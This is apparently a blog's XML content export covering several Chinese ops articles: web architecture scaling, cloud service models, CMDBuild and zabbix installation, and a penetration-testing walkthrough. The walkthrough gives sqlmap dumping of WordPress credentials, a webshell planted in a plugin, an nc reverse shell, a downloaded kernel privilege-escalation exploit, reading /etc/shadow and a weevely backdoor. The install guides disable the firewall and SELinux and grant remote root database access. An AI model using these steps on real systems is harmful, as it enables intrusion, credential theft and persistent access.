数据库读写分离网站在使用缓存后，使对大部分数据读操作访问都可以不通过数据库就能完成，但是仍有一部分读操作（缓存访问不命中、缓存过期）和全部的写操作都需要访问数据库，在网站的用户达到一定规模后，数据库因为负载压力过高而成为网站的瓶颈。 目前大部分的主流数据库都提供主从热备功能，通过配置两台数据库主从关系，可以将一台数据库服务器的数据更新同步到另一台服务器上。网站利用数据库的这一功能，实现数据库读写分离，从而改善数据库负载压力。如下图所示： 应用服务器在写数据的时候，访问主数据库，主数据库通过主从复制机制将数据更新同步到从数据库，这样当应用服务器读数据的时候，就可以通过从数据库获得数据。为了便于应用程序访问读写分离后的数据库，通常在应用服务器端使用专门的数据访问模块，使数据库读写分离对应用透明。 使用反向代理和 CDN 加速网站响应随着网站业务不断发展，用户规模越来越大，由于中国复杂的网络环境，不同地区的用户访问网站时，速度差别也极大。有研究表明，网站访问延迟和用户流失率正相关，网站访问越慢，用户越容易失去耐心而离开。为了提供更好的用户体验，留住用户，网站需要加速网站访问速度。主要手段有使用 CDN 和方向代理。如下图所示： CDN 和反向代理的基本原理都是缓存。 CDN 部署在网络提供商的机房，使用户在请求网站服务时，可以从距离自己最近的网络提供商机房获取数据 反向代理则部署在网站的中心机房，当用户请求到达中心机房后，首先访问的服务器是反向代理服务器，如果反向代理服务器中缓存着用户请求的资源，就将其直接返回给用户 使用 CDN 和反向代理的目的都是尽早返回数据给用户，一方面加快用户访问速度，另一方面也减轻后端服务器的负载压力。 使用分布式文件系统和分布式数据库系统任何强大的单一服务器都满足不了大型网站持续增长的业务需求。数据库经过读写分离后，从一台服务器拆分成两台服务器，但是随着网站业务的发展依然不能满足需求，这时需要使用分布式数据库。文件系统也一样，需要使用分布式文件系统。如下图所示： 分布式数据库是网站数据库拆分的最后手段，只有在单表数据规模非常庞大的时候才使用。不到不得已时，网站更常用的数据库拆分手段是业务分库，将不同业务的数据部署在不同的物理服务器上。 使用 NoSQL 和搜索引擎随着网站业务越来越复杂，对数据存储和检索的需求也越来越复杂，网站需要采用一些非关系数据库技术如 NoSQL 和非数据库查询技术如搜索引擎。如下图所示： NoSQL 和搜索引擎都是源自互联网的技术手段，对可伸缩的分布式特性具有更好的支持。应用服务器则通过一个统一数据访问模块访问各种数据，减轻应用程序管理诸多数据源的麻烦。 业务拆分大型网站为了应对日益复杂的业务场景，通过使用分而治之的手段将整个网站业务分成不同的产品线。如大型购物交易网站都会将首页、商铺、订单、买家、卖家等拆分成不同的产品线，分归不同的业务团队负责。 具体到技术上，也会根据产品线划分，将一个网站拆分成许多不同的应用，每个应用独立部署。应用之间可以通过一个超链接建立关系（在首页上的导航链接每个都指向不同的应用地址），也可以通过消息队列进行数据分发，当然最多的还是通过访问同一个数据存储系统来构成一个关联的完整系统，如下图所示： 分布式服务随着业务拆分越来越小，存储系统越来越庞大，应用系统的整体复杂度呈指数级增加，部署维护越来越困难。由于所有应用要和所有数据库系统连接，在数万台服务器规模的网站中，这些连接的数目是服务器规模的平方，导致数据库连接资源不足，拒绝服务。 既然每一个应用系统都需要执行许多相同的业务操作，比如用户管理、商品管理等，那么可以将这些共用的业务提取出来，独立部署。由这些可复用的业务连接数据库，提供共用业务服务，而应用系统只需要管理用户界面，通过分布式服务调用共用业务服务完成具体业务操作。如下图所示： 大型网站的架构演化到这里，基本上大多数的技术问题都得以解决，诸如跨数据中心的实时数据同步和具体网站业务相关的问题也都可以通过组合改进现有技术架构解决。]]></content>
      <categories>
        <category>系统运维</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IaaS、PaaS、SaaS的区别]]></title>
    <url>%2Farticles%2Fee520904.html</url>
    <content type="text"><![CDATA[背景你一定听说过云计算中的三个“高大上”的你一定听说过云计算中的三个“高大上”的概念：IaaS、PaaS和SaaS，这几个术语并不好理解。不过，如果你是个吃货，还喜欢披萨，这个问题就好解决了!好吧，其实你根本不是一个吃货，之所以自我标榜为吃货，其实是为了收获赞叹式的夸奖，“吃货还这么瘦，好羡慕啊!”或者，总得给站长身材的微丰找个像样的理由。本文通过通俗简单的例子，让你完全理解云计算这三大术语的区别。 吃货和披萨一个“吃货”是怎样吃到披萨的呢? 1. 在家自己做 这真是个麻烦事，你的准备很多东西，发面、做面团、进烤箱。。。。。简单列一下，需要下图所示的一切： 2. 买好速食披萨回家自己做着吃 你只需要从披萨店里买回成品，回家烘焙就好了，在自己的餐桌上吃。和自己在家做不同，你需要一个pizza供应商。 3. 打电话叫外卖将披萨送到家中 打个电话，pizza就送到家门口。 4.在披萨店吃披萨 你什么都不需要准备，连餐桌也是pizza店的。 总结一下，吃货可以通过如下途径吃披萨： 好了，现在忘掉pizza! 技术公司假设你是一家超牛X的技术公司，根本不需要别人提供服务，你拥有基础设施、应用等等其它一切，你把它们分为三层：基础设施(infrastructure)、平台(platform)和软件(software)，如下图： 这其实就是云计算的三个分层，基础设施在最下端，平台在中间，软件在顶端，分别是分别是Infrastructure-as-a-Service(IaaS)，Platform-as-a-Service(PaaS)，Software-as-a-Service(SaaS)，别的一些“软”的层可以在这些层上面添加。 而你的公司什么都有，现在所处的状态叫本地部署(On-Premises)，就像在自己家做pizza一样。几年前如果你想在办公室或者公司的网站上运行一些企业应用，你需要去买服务器，或者别的高昂的硬件来控制本地应用，让你的业务运行起来，这就叫本地部署。 假如你家BOSS突然有一天想明白了，只是为了吃上pizza，为什么非要自己做呢?于是，准备考虑一家云服务供应商，这个云服务供应商能提供哪些服务呢?其所能提供的云服务也就是云计算的三个分层：IaaS、PaaS和SaaS，就像pizza店提供三种服务：买成品回家做、外卖和到披萨店吃。 用一张图来表示就是这样的。 现在我们来谈谈具体细节。 IaaS: Infrastructure-as-a-Service(基础设施即服务) 有了IaaS，你可以将硬件外包到别的地方去。IaaS公司会提供场外服务器，存储和网络硬件，你可以租用。节省了维护成本和办公场地，公司可以在任何时候利用这些硬件来运行其应用。 一些大的IaaS公司包括Amazon, Microsoft, VMWare, Rackspace和Red Hat.不过这些公司又都有自己的专长，比如Amazon和微软给你提供的不只是IaaS，他们还会将其计算能力出租给你来host你的网站。 PaaS: Platform-as-a-Service(平台即服务) 第二层就是所谓的PaaS，某些时候也叫做中间件。你公司所有的开发都可以在这一层进行，节省了时间和资源。 PaaS公司在网上提供各种开发和分发应用的解决方案，比如虚拟服务器和操作系统。这节省了你在硬件上的费用，也让分散的工作室之间的合作变得更加容易。网页应用管理，应用设计，应用虚拟主机，存储，安全以及应用开发协作工具等。 一些大的PaaS提供者有Google App Engine,Microsoft Azure，Force.com,Heroku，Engine Yard。最近兴起的公司有AppFog,Mendix和Standing Cloud. SaaS: Software-as-a-Service(软件即服务) 第三层也就是所谓SaaS。这一层是和你的生活每天接触的一层，大多是通过网页浏览器来接入。任何一个远程服务器上的应用都可以通过网络来运行，就是SaaS了。 你消费的服务完全是从网页如Netflix,MOG,Google Apps,Box.net,Dropbox或者苹果的iCloud那里进入这些分类。尽管这些网页服务是用作商务和娱乐或者两者都有，但这也算是云技术的一部分。 一些用作商务的SaaS应用包括Citrix的Go To Meeting，Cisco的WebEx，Salesforce的CRM，ADP，Workday和SuccessFactors。 我们拿盖房子来举个例子没有云的时候相当于大家都是在自己盖房子，后来发现这样成本比较高，要请专业人员搭建维护，如果盖的太大用不了浪费，盖的太小如果人多又不够用，于是有了云。 IAAS相当于商品房，建筑商盖好，购买就行。不够再买一套（可以随时退货）。具体房子做什么用，自己决定，屋内的装修家居还是要自己负责。IAAS上购买的一般是主机，用户不光要开发程序，还要考虑搭建系统，维护运行环境，以及怎么容灾，怎么做到高可用，怎么扩容。 PAAS相当于租房，房子做什么用有一定限制，但装修家居什么的房东都做好了，不够再租也比较方便。PAAS上是服务的运行环境，服务商提供了扩容以及容灾机制，用户负责开发程序即可，但程序需要匹配PAAS上的环境，没有IAAS那样自由。 SAAS相当于酒店，需要的时候租一间住就行，不住了退，完全不用操心房间维护的问题，有不同风格档次的酒店以及不同格局的房间供你选择。SAAS提供的是具体的服务，多租户公用系统资源，资源利用率更高。 虽然比喻不太恰当，但应该算比较通俗了吧。]]></content>
      <categories>
        <category>系统运维</category>
      </categories>
      <tags>
        <tag>Cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker版cmdbuild安装教程]]></title>
    <url>%2Farticles%2F4fcc594d.html</url>
    <content type="text"><![CDATA[介绍CMDB –Configuration Management Database 配置管理数据库, CMDB存储与管理企业IT架构中设备的各种配置信息，它与所有服务支持和服务交付流程都紧密相联，支持这些流程的运转、发挥配置信息的价值，同时依赖于相关流程保证数据的准确性。 CMDB，几乎是每个运维人都绕不过去的字眼，但又是很多运维人的痛，因为基本上所有的互联网公司都在搞，都在想着把尽可能多信息都收集汇总过来，然后实现自动化,智能化，但是CMDB很少有成功的，因此它也被称为运维人的耻辱。 我们运维人不要再为了KPI，绩效等东东重复造轮子，并且造出来的轮子只能自己用。我们运维人工作中共同的迫切需求点是什么呢？ 1，中文的web页面即使丑点也可以接受。日常查看导入导出，新增等等操作方便，而且防止语言不通误操作。 2，数据库模型和业务逻辑是分离开的。只需要建业务逻辑字段就能自动映射为数据库模型。 3，动态实现表间关系。随着收集数据的完善，表与表之间关系越来越复杂，不要因后续业务需要，对表做出改动，而影响以前的关系和调用，可以动态扩展。想想一下，增加个关系字段，原来的代码都要改的酸爽。 4，自定义表。可以自定义根据业务需求建表和逻辑关系。 5，动态API接口。根据表逻辑改动API动态自动更改，弱化业务和数据关系的实现，并且能够和外部系统做联动，支持API接口调用，方便扩展和自动化。 以上需求是最迫切的，本人工作多年，自己用django写过cmdb系统，但到后来维护成本会越来越大，考察了国内外开源的软件，最终找到cmdbuild，基本上可以满足上面全部需求，下面就来介绍下用docker容器快速安装cmdbuild，因cmdbuild是国外的软件，所以国内文档很少。 参考官方文档 环境镜像版本：quentinv/cmdbuild:t7-2.1.4postgres 9.4 安装环境调整关闭防火墙 1systemctl stop firewalld.service PostgreSQL的安装cmdbuild数据存储是在PostgreSQL中的，生产环境建议建立PostgreSQL数据库集群，这里为单点。 1234#拉取最新镜像docker pull postgres#启动容器docker run --name pgsql -p 5432:5432 -e POSTGRES_PASSWORD=sunxu123 -v /data/postgres:/var/lib/postgresql/data -d postgres:latest 如做迁移，需要导入数据。如新建可跳过这步。 1234567891011#复制备份文件到容器中docker cp ./cmdbuild_db_dump_2018-07-13.sql pgsql:/tmp/# 进入容器后操作docker exec -it pgsql /bin/bash# 进Postgresql账号su postgres# 建库createdb -O postgres cmdbuild# 导数据psql -U postgres -d cmdbuild &lt; /tmp/cmdbuild_db_dump_2018-07-13.sql# 退出容器 Cmdbuild安装1234#拉取镜像docker pull quentinv/cmdbuild#启动容器docker run --name cmdbuild -p 8080:8080 -d quentinv/cmdbuild 配置使用登录设置语言和配置PostgreSQL 完成后登录。因为登录时需要读取数据库中的用户数据，默认导入进去的用户名/密码:admin/123456 填坑PostgreSQL 数据导入和导出 12pg_dump -U root cmdbuild &gt; cmdb_db_dump_2016-12-05.sqlpg_dump -U root cmdbuild &lt; cmdb_db_dump_2016-12-06.sql 如果导入数据出错，需删除数据库，重新导入 1234567#登录psql -U user#删除数据库drop database cmdbuild#创建数据库create database cmdbuild#导入 删除数据库时，删除失败，报错： 1ERROR: database &quot;mctest&quot; is being accessed by other users 详细：There are 2 other sessions using the database. 1234#断开所有连这个数据库的连接select pg_terminate_backend(pid) from (select pid from pg_stat_activity where datname = '数据库名' ) a;#删除数据库drop database db_name 科普123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475psql -U user -d dbname切换数据库,相当于mysql的use dbname\c dbname列举数据库，相当于mysql的show databases\l列举表，相当于mysql的show tables\dt查看表结构，相当于desc tblname,show columns from tbname\d tblname\di 查看索引 创建数据库： create database [数据库名]; 删除数据库： drop database [数据库名]; *重命名一个表： alter table [表名A] rename to [表名B]; *删除一个表： drop table [表名]; *在已有的表里添加字段： alter table [表名] add column [字段名] [类型]; 删除表中的字段： alter table [表名] drop column [字段名]; 修改数据库列属性alter table 表名 alter 列名 type 类型名(350)重命名一个字段： alter table [表名] rename column [字段名A] to [字段名B]; *给一个字段设置缺省值： alter table [表名] alter column [字段名] set default [新的默认值];*去除缺省值： alter table [表名] alter column [字段名] drop default; 在表中插入数据： insert into 表名 ([字段名m],[字段名n],......) values ([列m的值],[列n的值],......); 修改表中的某行某列的数据： update [表名] set [目标字段名]=[目标值] where [该行特征]; 删除表中某行数据： delete from [表名] where [该行特征]; delete from [表名];--删空整个表 创建表： create table ([字段名1] [类型1] ;,[字段名2] [类型2],......&lt;,primary key (字段名m,字段名n,...)&gt;;); \copyright 显示 PostgreSQL 的使用和发行条款\encoding [字元编码名称] 显示或设定用户端字元编码\h [名称] SQL 命令语法上的说明，用 * 显示全部命令\prompt [文本] 名称 提示用户设定内部变数\password [USERNAME] securely change the password for a user\q 退出 psql导入整个数据库psql -U postgres(用户名) 数据库名(缺省时同用户名) &lt; /data/dum.sql导出整个数据库pg_dump -h localhost -U postgres(用户名) 数据库名(缺省时同用户名) &gt;/data/dum.sql导出某个表pg_dump -h localhost -U postgres(用户名) 数据库名(缺省时同用户名) -t table(表名) &gt;/data/dum.sql压缩方法一般用dump导出数据会比较大，推荐使用xz压缩压缩方法 xz dum.sql 会生成 dum.sql.xz 的文件xz压缩数据倒数数据库方法xzcat /data/dum.sql.xz | psql -h localhost -U postgres(用户名) 数据库名(缺省时同用户名) 连接ldap 12345678910111213141516171819202122232425262728293031323334353637#进入cmdb容器docker exec -it db9235d3b86c /bin/bash#进入配置目录cd /usr/local/tomcat/webapps/ROOT/WEB-INF/conf#修改配置auth.conf## Authentication method chain (the first match stops the auth chain)#auth.methods=HeaderAuthenticator,CasAuthenticator,LdapAuthenticator,DBAuthenticatorauth.methods=LdapAuthenticator#force.ws.password.digest=true#### HEADER###header.attribute.name=username#### CAS###cas.server.url=https://casserver/cas#cas.login.page=/login#cas.service.param=service#cas.ticket.param=ticket#### LDAP##ldap.server.address=xxxxx // 测试ldap地址，请根据实际替换ldap.server.port=389ldap.use.ssl=falseldap.basedn=dc=xx,dc=xx,dc=comldap.bind.attribute=cn#ldap.search.filter=(&amp;(objectClass=myclass1)(objectClass=myclass2))##Accept only none (anonymous bind) and simple (simple bind)#ldap.search.auth.method=none##This section is only for simple bindldap.search.auth.method=simpleldap.search.auth.principal=cn=admin,dc=xx,dc=xxx,dc=comldap.search.auth.password=******* // 密码 这里贴一张本人以前用django写cmdb系统时的数据库设计图，仅供参考：]]></content>
      <categories>
        <category>应用运维</category>
        <category>服务搭建</category>
      </categories>
      <tags>
        <tag>Cmdb</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试之从收集信息到入侵提权]]></title>
    <url>%2Farticles%2F92dfa26d.html</url>
    <content type="text"><![CDATA[目的通过本文你将了解黑客常用的入手思路和技术手法，适合热爱网络信息安全的新手朋友了解学习。本文将从最开始的信息收集开始讲述黑客是如何一步步的攻破你的网站和服务器的.阅读本文你会学到以下内容： 1.渗透测试前的简单信息收集。 2.sqlmap的使用 3.nmap的使用 4.nc反弹提权 5.linux系统的权限提升 6.backtrack 5中渗透测试工具nikto和w3af的使用等. 环境假设黑客要入侵的你的网站域名为:hack-test.com 入侵过程IP信息让我们用ping命令获取网站服务器的IP地址. 现在我们获取了网站服务器的IP地址为:173.236.138.113 寻找同一服务器上的其它网站我们使用sameip.org. 26 sites hosted on IP Address 173.236.138.113 ID Domain Site Link 1 hijackthisforum.com hijackthisforum.com 2 sportforum.net sportforum.net 3 freeonlinesudoku.net freeonlinesudoku.net 4 cosplayhell.com cosplayhell.com 5 videogamenews.org videogamenews.org 6 gametour.com gametour.com 7 qualitypetsitting.net qualitypetsitting.net 8 brendanichols.com brendanichols.com 9 8ez.com 8ez.com 10 hack-test.com hack-test.com 11 kisax.com kisax.com 12 paisans.com paisans.com 13 mghz.com mghz.com 14 debateful.com debateful.com 15 jazzygoodtimes.com jazzygoodtimes.com 16 fruny.com fruny.com 17 vbum.com vbum.com 18 wuckie.com wuckie.com 19 force5inc.com force5inc.com 20 virushero.com virushero.com 21 twincitiesbusinesspeernetwork.com twincitiesbusinesspeernetwork.com 22 jennieko.com jennieko.com 23 davereedy.com davereedy.com 24 joygarrido.com joygarrido.com 25 prismapp.com prismapp.com 26 utiligolf.com utiligolf.com 173.236.138.113上有26个网站，很多黑客为了攻破你的网站可能会检查同服务器上的其它网站，但是本次是以研究为目标，我们将抛开服务器上的其它网站，只针对你的网站来进行入侵检测。 We’ll need more information about your site, such as: 我们需要关于你网站的以下信息： DNS records (A, NS, TXT, MX and SOA) Web Server Type (Apache, IIS, Tomcat) Registrar (the company that owns your domain) Your name, address, email and phone Scripts that your site uses (php, asp, asp.net, jsp, cfm) Your server OS (Unix,Linux,Windows,Solaris) Your server open ports to internet (80, 443, 21, etc.) DNS记录我们用who.is来完成这一目标. 我们发现你的DNS记录如下 web服务器的类型和版本 发现你的Web服务器是apache，接下来确定它的版本. 1234567HACK-TEST.COM SITE INFORMATIONIP: 173.236.138.113Website Status: activeServer Type: ApacheAlexa Trend/Rank: 从信息收集到入侵提权(渗透测试基础总结) - 第6张 | 阿德马Web安全 1 Month: 3,213,968 3 Month: 2,161,753Page Views per Visit: 从信息收集到入侵提权(渗透测试基础总结) - 第7张 | 阿德马Web安全 1 Month: 2.0 3 Month: 3.7 网站域名的注册信息例如你的电话、邮箱、地址等. 我们现在已经获取了你的网站域名的注册信息，包括你的重要信息等.我们可以通过backtrack 5中的whatweb来获取你的网站服务器操作系统类型和服务器的版本. 我们发现你的网站使用了著名的php整站程序wordpress，服务器的的系统类型为Fedora Linux，Web服务器版本Apache 2.2.15.继续查看网站服务器开放的端口，用渗透测试工具nmap: 查看服务器上运行的服务 查看操作系统版本只有80端口是开放的,操作系统是Linux2.6.22（Fedora Core 6），现在我们已经收集了所有关于你网站的重要信息, 接下来开始扫描寻找漏洞,比如: Sql injection – Blind sql injection – LFI – RFI – XSS – CSRF 等等. 使用Nikto来收集漏洞1root@bt:/pentest/web/nikto# perl nikto.pl -h hack-test.com 我们也会用到Backtrack 5 R1中的W3AF 工具: 1root@bt:/pentest/web/w3af# ./w3af_gui 我们输入要检测的网站地址,选择完整的安全审计选项. 稍等一会，你将会看到扫描结果. 发现你的网站存在sql注入漏洞、XSS漏洞、以及其它的漏洞.让我们来探讨SQL注入漏洞. http://hack-test.com/Hackademic_RTB1/?cat=d％27z％220 我们通过工具发现这个URL存在SQL注入，我们通过Sqlmap来检测这个url. Using sqlmap with –u url 过一会你会看到 输入N按回车键继续 我们发现你的网站存在mysql显错注入，mysql数据库版本是5.0. 我们通过加入参数”-dbs”来尝试采集数据库名. 发现三个数据库,接下来通过参数”-D wordpress -tables”来查看wordpress数据库的所有表名 通过参数“-T wp_users –columns ”来查看wp_users表中的字段. 接下来猜解字段user_login和user_pass的值.用参数”-C user_login,user_pass –dump” 我们会发现用户名和密码hashes值. 我们需要通过以下在线破解网站来破解密码hashes http://www.onlinehashcrack.com/free-hash-reverse.php 登陆wordpress的后台wp-admin 尝试上传php webshell到服务器，以方便运行一些linux命令.在插件页面寻找任何可以编辑的插件. 我们选择Textile这款插件，编辑插入我们的php webshell，点击更新文件，然后访问我们的php webshell. Php webshell被解析了，我们可以控制你网站的文件，但是我们只希望获得网站服务器的root权限,来入侵服务器上其它的网站。 我们用NC来反弹一个shell,首先在我们的电脑上监听5555端口. 然后在Php webshell上反向连接我们的电脑，输入你的IP和端口5555. 点击连接我们会看到 接下来我们尝试执行一些命令： 1234567891011iduid=48(apache) gid=489(apache) groups=489(apache) （用来显示用户的id和组）pwd/var/www/html/Hackademic_RTB1/wp-content/plugins （显示服务器上当前的路径）uname -aLinux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux（显示内核版本信息） 现在我们知道，服务器的内核版本是2.6.31.5-127.fc12.1686,我们在exploit-db.com中搜索此版本的相关漏洞.在服务器上测试了很多exp之后，我们用以下的exp来提升权限.http://www.exploit-db.com/exploits/15285 我们在nc shell上执行以下命令: 1wget http://www.exploit-db.com/exploits/15285 -o roro.c (下载exp到服务器并重命名为roro.c)注：很多linux内核的exp都是C语言开发的,因此我们保存为.c扩展名.exp roro.c代码如下： 12345678910111213141516171819202122232425262728293031323334353637# include &lt;stdio.h&gt;# include &lt;unistd.h&gt;# include &lt;stdlib.h&gt;# include &lt;fcntl.h&gt;# include &lt;sys/types.h&gt;# include &lt;sys/socket.h&gt;# include &lt;netinet/in.h&gt;# include &lt;errno.h&gt;# include &lt;string.h&gt;# include &lt;sys/ptrace.h&gt;# include &lt;sys/utsname.h&gt;# define RECVPORT 5555# define SENDPORT 6666int prep_sock(int port)&#123;int s, ret;struct sockaddr_in addr;s = socket(PF_RDS, SOCK_SEQPACKET, 0);if(s &lt; 0)&#123;printf(“[*] Could not open socket.\n”);exit(-1);&#125;memset(&amp;addr, 0, sizeof(addr)); 通过以上代码我们发现该exp是C语言开发的，我们需要将他编译成elf格式的,命令如下: 1gcc roro.c –o roro 接下来执行编译好的exp 1./roro 执行完成之后我们输入id命令 1id 我们发现我们已经是root权限了 uid=0(root) gid=0(root) 现在我们可以查看/etc/shadow文件 1cat /etc/shadow 查看/etc/passwd 文件 1cat /etc/passwd 我们可以使用”john the ripper”工具破解所有用户的密码.但是我们不会这样做，我们需要在这个服务器上留下后门以方便我们在任何时候访问它. 我们用weevely制作一个php小马上传到服务器上. 1.weevely使用选项 1root@bt:/pentest/backdoors/web/weevely# ./main.py – 2.用weevely创建一个密码为koko的php后门 1root@bt:/pentest/backdoors/web/weevely# ./main.py -g -o hax.php -p koko 接下来上传到服务器之后来使用它 1root@bt:/pentest/backdoors/web/weevely# ./main.py -t -u http://hack-test.com/Hackademic_RTB1/wp-content/plugins/hax.php -p koko 测试我们的hax.php后门 总结: 在这边文章中我们学到的一些技术正被黑客用来入侵你的网站和服务器，我们希望能通过这篇文章能够对你未来维护服务器和网站安全有所帮助.]]></content>
      <categories>
        <category>运维安全</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix-proxy安装部署]]></title>
    <url>%2Farticles%2F3f5bc800.html</url>
    <content type="text"><![CDATA[目的随着互联网公司的不断发展和业务的不断拓展，只用zabbix-server单节点作为数据收集已越来越吃力，不能满足需求，这是扩展zabbix监控系统势在必行，zabbix-proxy代理就可以帮到你，能够有效的分担server压力。本文详细介绍了zabbix-proxy的安装部署过程，因互联网公司线上业务稳定性是最重要的，监控系统更是如此，所有监控系统搭建时版本建议用长期支持版。 环境配置查看selinux状态12345678910111213141516171819[root@localhost ~]# sestatus SELinux status: enabled SELinuxfs mount: /sys/fs/selinux SELinux root directory: /etc/selinux Loaded policy name: targeted Current mode: enforcing Mode from config file: enforcing Policy MLS status: enabled Policy deny_unknown status: allowed Max kernel policy version: 28 临时关闭 sellinux1[root@localhost ~]# setenforce 0 永久关闭12345678910111213141516171819202122232425262728293031323334#可以修改配置文件/etc/selinux/config,将其中SELINUX设置为disabled。[root@localhost ~]# cat /etc/selinux/config # This file controls the state of SELinux on the system. # SELINUX= can take one of these three values: # enforcing - SELinux security policy is enforced. # permissive - SELinux prints warnings instead of enforcing. # disabled - No SELinux policy is loaded. #SELINUX=enforcing SELINUX=disabled # SELINUXTYPE= can take one of three two values: # targeted - Targeted processes are protected, # minimum - Modification of targeted policy. Only selected processes are protected. # mls - Multi Level Security protection. SELINUXTYPE=targeted [root@rdo ~]# sestatus SELinux status: disabled 关闭防火墙直接关闭防火墙 12systemctlstop firewalld.service #停止firewallsystemctldisable firewalld.service #禁止firewall开机启动 安装数据库我们现在来配置mysql数据库。 开机自启动mysql，并启动mysql123systemctlenable mariadbsystemctlstart mariadb 初始化mysql数据库，并配置root用户密码1mysql_secure_installation 注意：在上图中的Enter current passwdord for root处，我们直接敲回车键即可。因为centos7上mysql的默认root用户密码为空。 下图中主要是为root用户配置密码，并刷新相关权限。 上图中主要是配置匿名用户、test用户以及root用户远程连接等相关配置。 创建zabbix数据库及其用户1mysql -u root –p 123456789101112131415&gt; create database zabbix_proxycharacter set utf8; #数据名可以跟server端名称不同&gt; GRANT ALL PRIVILEGES ON zabbix_proxy.* TO 'zabbix'@'localhost' IDENTIFIED BY 'zabbix-proxy';&gt; GRANT ALL PRIVILEGES ON zabbix_proxy.* TO'zabbix'@'%' IDENTIFIED BY 'zabbix-proxy';&gt; flush PRIVILEGES;&gt; set GLOBAL max_connections=10000;&gt; grant all privileges on *.* to root@'%'identified by 'tdr123'; #也可以放行root访问权限&gt; flush privileges;&gt; exit; 安装zabbix proxy12rpm -ivh http://repo.zabbix.com/zabbix/3.0/rhel/7/x86_64/zabbix-release-3.0-1.el7.noarch.rpmyum install -y zabbix-proxy zabbix-java-gateway zabbix-agent zabbix-get mariadb* ** 以上安装完毕后，我们现在开始进行zabbix的相关配置。 导入zabbix数据库结构：12cd /usr/share/doc/zabbix-proxy-mysql-3.0.9/zcat schema.sql.gz| mysql -uroot -p zabbix_proxy 修改zabbix proxy的配置文件12345678910111213141516171819202122232425vim /etc/zabbix/zabbix-proxy.confServer=192.168.11.139 #同步指向的server端的IP，非本地IP。可以是server端的主机域名，但要确保proxy端解析server的域名，并且网络可达Hostname=zabbix-proxy-sh140 #proxy本地的名称，此名称需要与将来在server端的WEB页面上的代理程序名称一致，名称自定义DBHost=localhost #与上面配置对应DBName=zabbix_proxy #与上面配置对应DBUser=zabbix #与上面配置对应DBPassword=zabbix-proxy #与上面配置对应DBPort=3306 #与上面配置对应StartDiscoverers=4 #与server端配置的功能说明一致。JavaGateway=127.0.0.1 #与server端配置的功能说明一致。JavaGatewayPort=10052 #与server端配置的功能说明一致。StartJavaPollers=4 #与server端配置的功能说明一致。StartSNMPTrapper=1 Hostname=zabbix-proxy-sh140 #proxy本地的名称，此名称需要与将来在server端的WEB页面上的代理程序名称一致，名称自定义 DBHost=localhost #与上面配置对应 DBName=zabbix_proxy #与上面配置对应 DBUser=zabbix #与上面配置对应 DBPassword=zabbix-proxy #与上面配置对应 DBPort=3306 #与上面配置对应 StartDiscoverers=4 #与server端配置的功能说明一致。 JavaGateway=127.0.0.1 #与server端配置的功能说明一致。 JavaGatewayPort=10052 #与server端配置的功能说明一致。 StartJavaPollers=4 #与server端配置的功能说明一致。 StartSNMPTrapper=1 启动服务1234# service zabbix-java-gateway start# service zabbix-proxy start# chkconfig zabbix-java-gateway on# chkconfig zabbix-proxy on 更新备监控的主机zabbix_agentd.win.conf12Server=192.168.11.140ServerActive=192.168.11.140 修改完后重启zabbix_agent服务 1service zabbix-agent restart 新增代理配置 最终效果：]]></content>
      <categories>
        <category>应用运维</category>
        <category>服务搭建</category>
      </categories>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix3.0.x在lnmp全编译安装]]></title>
    <url>%2Farticles%2F3131633d.html</url>
    <content type="text"><![CDATA[目的zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。因其监控方式多样，上手容易在互联网行业备受欢迎。那么本文就详细介绍编译安装zabbix长期支持版本(LST). 环境版本：lnmp系统：​ ubuntu 14.04 ​ nginx 1.10.1 ​ mysql 5.7.13 ​ php 5.6.23 监控系统：​ zabbix 3.0.3 ​ zatree 3.0.x ​ grafana 3.1.0 安装路径：程序安装路径：/opt/zabbix 数据路径：/data/zabbix 安装安装nginx + php安装依赖包12sudo apt-get updatesudo apt-get -y install make gcc g++ libpcre3-dev libssl-dev libpng-dev libxml2-dev libcurl4-openssl-dev 编译安装nginx创建运行账户及组 12sudo groupadd wwwsudo useradd www -s /sbin/nologin -g www 开始编译nginx 123456789cd /optsudo wget http://nginx.org/download/nginx-1.10.1.tar.gzsudo tar zxvf nginx-1.10.1.tar.gz cd nginx-1.10.1/sudo ./configure --user=www --group=www --prefix=/opt/nginx --with-http_stub_status_module --with-http_ssl_modulesudo makesudo make installcd /optsudo chown -R www.www nginx 创建nginx启动脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445sudo vim /etc/init.d/nginx#!/bin/sh ### BEGIN INIT INFO # Provides: nginx # Required-Start: # Required-Stop: # Default-Start: 2 3 4 5 # Default-Stop: 0 1 6 # Short-Description: nginx # Description: nginx server ### END INIT INFO . /lib/lsb/init-functions PROGRAM=/opt/nginx/sbin/nginx test -x $PROGRAM || exit 0 case "$1" in start) log_begin_msg "Starting Nginx server" /opt/nginx/sbin/nginx log_end_msg 0 ;; stop) PID=`cat /opt/nginx/logs/nginx.pid` log_begin_msg "Stopping Nginx server" if [ ! -z "$PID" ]; then kill -15 $PID fi log_end_msg 0 ;; restart) $0 stop $0 start ;; *) log_success_msg "Usage: service nginx &#123;start|stop|restart&#125;" exit 1 esac exit 0 添加启动权限并启动nginx 123sudo chmod +x /etc/init.d/nginxsudo /etc/init.d/nginx startsudo update-rc.d nginx defaults 验证是否安装成功。在浏览器地址栏输入ip,出现下图为ok. 安装php安装bzip212345678cd /optsudo wget http://www.bzip.org/1.0.6/bzip2-1.0.6.tar.gzsudo tar zxvf bzip2-1.0.6.tar.gzcd bzip2-1.0.6/###64位系统需要修改Makefile文件后再make，修改内容如下CC=gcc -fPICsudo makesudo make install PREFIX=/opt/bzip2 安装zlib1234567cd /optsudo wget http://heanet.dl.sourceforge.net/project/libpng/zlib/1.2.8/zlib-1.2.8.tar.gzsudo tar zxvf zlib-1.2.8.tar.gzcd zlib-1.2.8/sudo ./configure --prefix=/opt/zlibsudo makesudo make install 安装libmcrypt1234567cd /optsudo wget 